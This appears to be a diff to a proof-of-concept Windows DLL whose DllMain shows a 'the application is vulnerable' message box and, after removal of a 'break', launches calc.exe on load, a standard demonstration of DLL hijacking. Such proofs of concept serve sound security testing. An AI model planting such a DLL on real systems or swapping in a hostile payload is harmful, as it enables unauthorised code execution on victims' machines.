@@ -7,7 +7,6 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReser
     {
     case DLL_PROCESS_ATTACH:
         MessageBox(NULL, L"Hello, the application is vulnerable", L"Message", MB_OK);
-        break;
         // Launch calc.exe
         WinExec("calc.exe", SW_SHOWNORMAL);
         break;
@@ -18,3 +17,5 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReser
     }
     return TRUE;
 }
+
+
